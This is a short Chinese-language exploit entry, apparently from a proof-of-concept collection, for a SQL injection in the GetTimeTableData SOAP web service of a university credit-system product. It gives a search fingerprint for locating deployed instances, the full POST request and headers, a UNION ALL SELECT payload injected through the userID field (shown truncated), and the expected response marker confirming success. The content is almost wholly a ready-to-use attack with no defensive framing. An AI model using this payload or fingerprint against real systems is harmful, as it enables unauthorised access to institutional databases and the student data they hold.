# 学分制系统GetTimeTableDataSQL注入漏洞

- **系统**：学分制系统GetTimeTableData　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="www.pantosoft.com"`
- **请求**：`POST /WebService/Interactive.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=bwk5l0xu02utzfib4tmsap5t`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/GetTimeTableData](http://tempuri.org/GetTimeTableData)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 1418`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetTimeTableData>
<!--type: string-->
<tem:userID>gero et' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(113)+CHAR(74)+CHAR(88)+CHAR(79)+CHAR(115)+CHAR(68)+CHAR(99)+CHAR(75)+CHA…（脚本共 1361 字，完整版见原文）
```
- **预期**：500　|　qqvkqJX0sDcKaNVURWDaGFGPQsXfSrbXtD0ZxKJSjUWBqqjqbq